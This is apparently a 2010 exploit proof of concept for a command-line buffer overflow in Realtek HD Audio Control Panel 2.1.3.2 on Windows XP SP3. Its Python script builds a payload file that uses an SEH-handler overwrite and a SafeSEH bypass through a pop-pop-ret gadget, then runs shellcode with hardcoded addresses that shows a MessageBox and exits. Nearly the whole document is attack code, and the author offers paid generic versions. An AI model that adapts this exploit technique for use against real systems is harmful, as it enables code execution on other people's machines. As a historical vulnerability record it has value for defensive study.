Realtek HD Audio Control Panel 2.1.3.2 Exploit
==============================================

# done by BraniX <branix@hackers.org.pl>
# www.hackers.org.pl
# found: 2010.08.24
# tested on: Windows XP SP3 Home Edition
# SafeSEH bypass
 
# App. has classic buffer overflow vulnerability
# it can be triggered by passing a too long argument
# as a startup parameter. Shellcode can by run via classic
# ret overwrite or SEH Handler overwrite ... so it&#039;s a mini-combo ;)
 
# Ps. If you need a generic exploit ...
# (no hardcoded VA&#039;a), write it yourself ;) or &#039;donate few&#039; $$$
# we will c0de it for You ^^
 
filepath = "C:\\ShellCode\\RTHDCPL 2.1.3.2 - Exploit.bin"
f = open(filepath, "wb")
 
f.write(&#039;A&#039;*4)
f.write(&#039;\x5E&#039;)                     # pop esi
f.write(&#039;\x5E&#039;)                     # pop esi
f.write(&#039;\xC3&#039;)                     # ret
f.write(&#039;\x90&#039;)                     # nop
 
f.write(&#039;[BraniX]&#039;)
f.write(&#039;A&#039;*448)                    # mock
 
f.write(&#039;\xEB\x06&#039;)                 # jmp +6
f.write(&#039;\x90&#039;)                     # nop
f.write(&#039;\x90&#039;)                     # nop
 
f.write(&#039;\x70\x01\xA5\x01&#039;)         # pop; pop; ret; address
 
f.write(&#039;\x83\xC1\x0C&#039;)             # add ecx, 0Ch
f.write(&#039;\x88\x01&#039;)                 # mov byte ptr [ecx], al
f.write(&#039;\x83\xE9\x08&#039;)             # sub ecx, 08
f.write(&#039;\x50&#039;)                     # push eax
f.write(&#039;\x51&#039;)                     # push ecx
f.write(&#039;\x51&#039;)                     # push ecx
f.write(&#039;\x50&#039;)                     # push eax
f.write(&#039;\xE8\xC5\x08\x27\x7E&#039;)     # call user32.MessageBoxA
 
f.write(&#039;\x50&#039;)                     # push eax
f.write(&#039;\xE8\xE7\xCB\x6E\x7C&#039;)     # call kernel32.ExitProcess
 
f.write(&#039;\xCC&#039;*1500)                # int 3&#039;s
 
f.close()
 
print "Done ..."



